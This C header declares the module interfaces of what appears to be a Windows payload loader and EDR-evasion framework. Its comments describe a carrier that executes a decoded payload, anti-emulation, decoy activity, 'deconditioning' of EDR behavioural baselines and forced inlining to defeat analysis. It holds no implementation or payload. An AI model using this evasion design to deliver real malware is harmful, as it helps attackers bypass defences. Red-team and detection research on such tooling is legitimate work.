#ifndef DEFINITIONS_H
#define DEFINITIONS_H

#include <windows.h>

// Standard Permissions
#define p_RW  0x04
#define p_RX  0x20
#define p_RWX 0x40

// Force-inline: eliminates named call targets in the binary.
// Applied to decode_payload and MyVirtualProtect so their code merges
// into the carrier, defeating function-boundary analysis.
// New module variants: match FORCE_INLINE on the definition to match this declaration.
#if defined(__clang__) || defined(__GNUC__)
#define FORCE_INLINE __attribute__((always_inline)) static inline
#else
#define FORCE_INLINE static inline
#endif

// Wrapper for VirtualProtect to allow hooking/instrumentation
// implementations can redefine this
typedef BOOL (WINAPI *VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef LPVOID (WINAPI *VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);

// Module Interfaces
// Each module file should implement one of these functions. 
// The Fuzzer/Builder will paste the implementation into the final C file.

// Carrier: Responsible for setting up memory and executing payload.
// Returns 0 on success, non-zero on error.
int carrier(void);

// Decoder: Decrypts 'len' bytes at 'dest'.
FORCE_INLINE void decode_payload(char *dest, int len);

// AntiEmulation: Burns resources or checks environment. 
// Should return quickly if real, stall/crash if fake.
void antiemulation(void);

// Decoy: Executes benign activity to mislead behavioral analysis.
void decoy(void);

// Deconditioner: Rehearses the carrier's alloc/write/protect/free pattern
// with benign data to normalize EDR behavioral baselines.
void deconditioner(void);

// Guardrail: Checks execution environment.
// Returns 0 if safe to run, non-zero if we should bail.
int guardrail(void);

// VirtualProtect Module: Wraps the API for hooking/evasion
FORCE_INLINE BOOL MyVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);

// Global Payload Access (Provided by payload.h)
extern unsigned char supermega_payload[];

#ifdef ENGLISH_ENCODING
// English decoder needs these (defined in payload.h when encoding=english)
extern const char* DICTIONARY[];
extern char supermega_payload_str[];
#endif

#endif
